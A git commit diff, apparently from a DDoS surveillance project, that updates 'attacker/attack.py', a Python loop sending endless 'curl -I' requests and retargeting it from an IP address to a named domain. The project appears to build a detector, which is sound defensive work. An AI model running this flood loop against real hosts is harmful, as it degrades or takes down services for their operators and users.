d65b713280e843b7a4fdd2baef9d3442019f1620
Rahulkumar Choudhary <rahulchoudhary5768@gmail.com>
2024-10-13 13:11:53 -0500

    updated attacker script

--- attacker/attack.py
+++ attacker/attack.py
@@ -1,7 +1,7 @@
-#!/bin/bash
+#!/Users/rahul/Documents/code/DDoS-attack-surveillance/ddos/bin/python3
 
 import os
 
 while True:
-    os.system(f'curl -I http:34.31.179.239')
+    os.system(f'curl -I http://ddos.noline.club/')
     
